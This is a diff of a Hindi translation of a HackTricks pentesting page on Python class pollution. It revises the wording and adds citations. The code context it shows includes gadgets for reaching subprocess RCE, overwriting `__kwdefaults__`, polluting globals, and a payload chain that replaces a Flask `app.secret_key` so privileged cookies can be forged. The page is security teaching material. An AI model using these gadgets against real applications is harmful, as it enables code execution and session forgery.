@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Example
+## मूल उदाहरण
 
-जांचें कि कैसे वस्तुओं की कक्षाओं को स्ट्रिंग्स के साथ प्रदूषित करना संभव है:
+जांचें कि strings के साथ objects की classes को pollute करना कैसे संभव है:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## बुनियादी कमजोरियों का उदाहरण
+## मूलभूत Vulnerability उदाहरण
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Gadget Examples
+## गैजेट उदाहरण
 
 <details>
 
-<summary>क्लास प्रॉपर्टी डिफ़ॉल्ट मान को RCE (सबप्रोसेस) बनाने</summary>
+<summary>RCE (subprocess) के लिए class property का default value बनाना</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>अन्य कक्षाओं और वैश्विक वेरिएबल्स को <code>globals</code> के माध्यम से प्रदूषित करना</summary>
+<summary><code>globals</code> के माध्यम से अन्य classes और global vars को pollute करना</summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>मनमाने उपप्रक्रिया निष्पादन</summary>
+<summary>मनमाना subprocess execution</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -180,9 +180,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>ओवरराइटिंग <strong><code>__kwdefaults__</code></strong></summary>
+<summary><strong><code>__kwdefaults__</code></strong> को ओवरराइट करना</summary>
 
-**`__kwdefaults__`** सभी फ़ंक्शनों का एक विशेष गुण है, जो Python [documentation](https://docs.python.org/3/library/inspect.html) पर आधारित है, यह “**कीवर्ड-केवल** पैरामीटर के लिए किसी भी डिफ़ॉल्ट मान का मैपिंग” है। इस गुण को प्रदूषित करना हमें एक फ़ंक्शन के कीवर्ड-केवल पैरामीटर के डिफ़ॉल्ट मानों को नियंत्रित करने की अनुमति देता है, ये फ़ंक्शन के पैरामीटर हैं जो \* या \*args के बाद आते हैं।
+**`__kwdefaults__`** सभी functions का एक विशेष attribute है। Python [documentation](https://docs.python.org/3/library/inspect.html) के अनुसार, यह “**keyword-only** parameters के लिए किसी भी default values की mapping” है। इस attribute को pollute करने से हम किसी function के keyword-only parameters की default values को नियंत्रित कर सकते हैं। ये function के वे parameters होते हैं जो \* या \*args के बाद आते हैं।<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,25 +223,25 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>फाइलों के बीच Flask गुप्त को ओवरराइट करना</summary>
+<summary>Files के across Flask secret को Overwriting करना</summary>
 
-तो, यदि आप मुख्य पायथन फ़ाइल में परिभाषित एक ऑब्जेक्ट पर क्लास प्रदूषण कर सकते हैं लेकिन **जिसकी क्लास एक अलग फ़ाइल में परिभाषित है** मुख्य फ़ाइल से। क्योंकि पिछले पेलोड में \_\_globals\_\_ तक पहुँचने के लिए आपको ऑब्जेक्ट की क्लास या क्लास के तरीकों तक पहुँचने की आवश्यकता है, आप **उस फ़ाइल में ग्लोबल्स तक पहुँच पाएंगे, लेकिन मुख्य फ़ाइल में नहीं**। \
-इसलिए, आप **Flask ऐप ग्लोबल ऑब्जेक्ट** तक पहुँचने में असमर्थ होंगे जिसने मुख्य पृष्ठ पर **गुप्त कुंजी** को परिभाषित किया:
+तो, यदि आप web की main python file में defined किसी object पर class pollution कर सकते हैं, लेकिन **जिसकी class main file से अलग किसी file में defined है**। क्योंकि पिछले payloads में \_\_globals\_\_ तक पहुंचने के लिए आपको object की class या class के methods तक पहुंचना आवश्यक है, इसलिए आप **उस file में मौजूद globals तक पहुंच सकेंगे, लेकिन main file में मौजूद globals तक नहीं**। \
+इसलिए, आप main page में **secret key** को define करने वाले **Flask app global object** तक **नहीं पहुंच सकेंगे**:<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-इस परिदृश्य में, आपको फ़ाइलों को पार करने के लिए एक गैजेट की आवश्यकता है ताकि मुख्य फ़ाइल तक पहुँच सकें और **वैश्विक ऑब्जेक्ट `app.secret_key`** तक पहुँच सकें ताकि Flask गुप्त कुंजी को बदल सकें और इस कुंजी को जानकर [**अधिकार बढ़ा सकें**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)।
+इस scenario में आपको files को traverse करने के लिए एक gadget की आवश्यकता है, ताकि **global object `app.secret_key` तक access** करके Flask secret key को बदल सकें और इस key को जानकर [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) कर सकें।
 
-इस तरह का एक पेलोड [इस लेख से](https://ctftime.org/writeup/36082):
+इस [writeup](https://ctftime.org/writeup/36082) से लिया गया इस तरह का एक payload:<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-इस पेलोड का उपयोग करें **`app.secret_key`** को बदलने के लिए (आपके ऐप में नाम अलग हो सकता है) ताकि नए और अधिक विशेषाधिकार प्राप्त फ्लास्क कुकीज़ पर हस्ताक्षर किया जा सके।
+इस payload का उपयोग करके **`app.secret_key`** (आपके app में नाम अलग हो सकता है) को **change** करें, ताकि आप नए और अधिक privileges वाले flask cookies को sign कर सकें।
 
 </details>
 
-अधिक पढ़ने के लिए निम्नलिखित पृष्ठ को भी देखें:
+अधिक read only gadgets के लिए निम्नलिखित page भी देखें:
 
 
 {{#ref}}
@@ -250,6 +250,7 @@ python-internal-read-gadgets.md
 
 ## संदर्भ
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
